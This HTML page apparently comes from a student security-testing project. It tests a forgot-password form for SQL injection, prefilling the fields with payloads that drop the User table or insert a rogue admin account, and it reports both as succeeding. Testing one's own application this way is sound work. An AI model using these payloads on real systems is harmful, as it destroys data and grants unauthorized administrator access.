<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="../resources/secure_app.css">
    <link rel="icon" type="image/svg" href="../resources/Header_Lock_Image.svg">
    <script async src="../resources/nav.js"></script>
    <meta charset="utf-8" />
    <title>Secure ED. Tests - SQL Injection Forgot Password Test</title>
</head>

<body>
    <div id="wrapper">
        <header>
            <table class="header_table">
                <tbody>
                <tr>
                    <td class="lock"><img src="../resources/Header_Lock_Image.svg" style="width:9vh;" alt="Header_lock"></td>
                    <td class="title"><b>Secure ED. Tests</b></td>
                    <td class="header_table_cell"></td>
                </tr>
                </tbody>
            </table>
        </header>

        <!--Navigation Buttons-->
        <nav>
            <button class="button_large" type="button" onclick="toIndex();">Exit Tests</button>
        </nav>

        <main>
            <h1>SQL Injection Forgot Password Test</h1>
            <div class=horizontal_line>
                <hr>
            </div>
            <br><br>
            <div style="text-align:center">
                <label class="sqlinject_label"> Injection Type:
                    <select name="sqlinject" id="sqlinject" onchange="changeinjection()">
                        <optgroup label="SQL Injection">
                            <option selected="selected" value="1" >Delete user table</option>
                            <option value="2">Create admin user</option>
                        </optgroup>
                    </select>
                <div class = "NewPassword" style="text-align:right" >
                    <form action="../src/ForgotPasswordChangeLogic.php" method="POST">
                        <table>
                            <tr>
                                <td><label for="newpassword">New Password:&nbsp;&nbsp;</label></td>
                                <td><input type="password" id="newpassword" name="newpassword" value="'='a'; DROP TABLE User;'--"></td>
                            </tr>
                            <tr>
                                <td><label for="confirmpassword">Confirm password:&nbsp;&nbsp;</label></td>
                                <td><input type="password" id="confirmpassword" name="confirmpassword" value="'='a'; DROP TABLE User;'--"></td>
                            </tr>
                        </table>
                        <div style="text-align:center"><input type="submit" value="Submit" ></div>
                    </form>
                </div>
                <div id="injection">
                    <p>Statement to execute: </p>
                    <p>UPDATE User SET Password='[hashed pass]' WHERE Email =' ' AND ' '='a'; DROP TABLE User;'-- = AND ' '=' '; DROP TABLE User;'--';</p>
                    <p>Intended result: Drops the user table </p>
                    <p>Actual result: Same as intended </p>
                </div>
            </div>
        </main>
    </div>
    <script>
        function changeinjection ()
        {
            //get elements from page
            var sqlinject = document.getElementById("sqlinject");
            var injectiondiv = document.getElementById("injection");
            var newpassword = document.getElementById("newpassword");
            var confirmpassword = document.getElementById("confirmpassword");

            //change parts of page depending on selection
            try
            {
                while (injectiondiv.removeChild(injectiondiv.childNodes[0]) !== null)
                {
                    //tries to remove all previous elements in the div
                }
            }
            catch
            {
                //succeeds when it throws exception
            }

            //Change the info on screen according to the selected option
            if(sqlinject.options[sqlinject.selectedIndex].value === "1")
            {
                injectiondiv.innerHTML = "<p>Statement to execute: </p>" +
                    " <p>UPDATE User SET Password='[hashed pass]' WHERE Email =' ' AND ' '='a'; DROP TABLE User;'-- = AND ' '=' '; DROP TABLE User;'--';</p>" +
                    "<p>Intended result: Drops the user table </p>" +
                    "<p>Actual result: Same as intended </p>";
                newpassword.value = "'='a'; DROP TABLE User;'--";
                confirmpassword.value = "'='a'; DROP TABLE User;'--";
            }
            else if(sqlinject.options[sqlinject.selectedIndex].value === "2")
            {
                injectiondiv.innerHTML = "<p>Statement to execute: </p> " +
                    "<p>UPDATE User SET Password='[hashed pass]' WHERE Email =' ' AND ' '='a'; INSERT INTO User (UserID, Email, AccType, Password, FName, LName, DOB, Year, Rank, SQuestion, SAnswer) VALUES ('10000000', 'hackerman@getrekt.com','1', '111', 'Hacker', 'Man', '1111-11-11', NULL, NULL, 'get', 'rekt');'-- = ' '='a'; INSERT INTO User (UserID, Email, AccType, Password, FName, LName, DOB, Year, Rank, SQuestion, SAnswer) VALUES ('10000000', 'hackerman@getrekt.com','1', '111', 'Hacker', 'Man', '1111-11-11', NULL, NULL, 'get', 'rekt');'--'; </p>" +
                    "<p>Intended result: Inserts hackerman as an admin into the User table</p>" +
                    "<p>Actual result: Same as intended. </p>";
                newpassword.value = "'='a'; INSERT INTO User (UserID, Email, AccType, Password, FName, LName, DOB, Year, Rank, SQuestion, SAnswer) VALUES ('10000000', 'hackerman@getrekt.com','1', '111', 'Hacker', 'Man', '1111-11-11', NULL, NULL, 'get', 'rekt');";
                confirmpassword.value = "'='a'; INSERT INTO User (UserID, Email, AccType, Password, FName, LName, DOB, Year, Rank, SQuestion, SAnswer) VALUES ('10000000', 'hackerman@getrekt.com','1', '111', 'Hacker', 'Man', '1111-11-11', NULL, NULL, 'get', 'rekt');";
            }
        }
    </script>
</body>
</html>